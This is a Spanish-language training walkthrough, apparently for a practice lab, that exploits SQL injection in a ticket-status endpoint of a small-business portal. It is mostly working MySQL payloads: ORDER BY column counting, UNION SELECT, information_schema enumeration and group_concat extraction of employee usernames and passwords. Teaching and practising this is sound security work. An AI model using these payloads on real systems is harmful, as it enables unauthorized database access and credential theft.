# 🧩 Guía SQLi – Enumeración de base de datos (Portal PYME)

## 🎯 Objetivo

A partir del endpoint:

/estado_ticket.php?codigo=

vamos a:

1. Confirmar SQLi  
2. Identificar número de columnas  
3. Obtener nombre de la base de datos  
4. Listar tablas  
5. Listar columnas  
6. Extraer datos  

---

## 🟢 1. Punto de partida

Usamos un ticket válido:

TCK-2026-001

URL base:

http://IP/portal_pyme/estado_ticket.php?codigo=TCK-2026-001

---

## 🔎 2. Confirmar SQL Injection

TCK-2026-001'

Si hay error o comportamiento distinto → posible SQLi

---

## 🔥 3. Confirmación real

' OR '1'='1'#

Si muestra varios tickets → SQLi confirmada

---

## 🧠 4. Número de columnas (IMPORTANTE)

Probamos:

' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#

Hasta que falle:

' ORDER BY 7# → ERROR

Resultado:

La query tiene 6 columnas

---

## 💣 5. Preparar UNION SELECT

' UNION SELECT 'A','B','C','D','E','F'#

---

## 🟣 6. Obtener nombre de la base de datos

' UNION SELECT database(),'B','C','D','E','F'#

---

## 🟠 7. Listar tablas

' UNION SELECT group_concat(table_name),'B','C','D','E','F'
FROM information_schema.tables
WHERE table_schema = database()#

---

## 🟡 8. Listar columnas de la tabla tickets

' UNION SELECT group_concat(column_name separator ' | '),'B','C','D','E','F'
FROM information_schema.columns
WHERE table_name = 'tickets'#

---

## 🔵 9. Listar columnas de empleados

' UNION SELECT group_concat(column_name separator ' | '),'B','C','D','E','F'
FROM information_schema.columns
WHERE table_name = 'empleados'#

---

## 🔴 10. Extraer usuarios

' UNION SELECT group_concat(username separator ' | '),'B','C','D','E','F'
FROM empleados#

---

## 💥 11. Extraer credenciales

' UNION SELECT group_concat(username,':',password separator ' | '),'B','C','D','E','F'
FROM empleados#

---

## 🧠 Puntos clave del aprendizaje

- SQLi en endpoint público  
- Uso de ORDER BY  
- Uso de UNION SELECT  
- Uso de database()  
- Uso de information_schema  
- Uso de group_concat  

---

## 🏁 Resumen final

1. Detectar SQLi  
2. Contar columnas  
3. Usar UNION  
4. Enumerar base de datos  
5. Extraer datos  
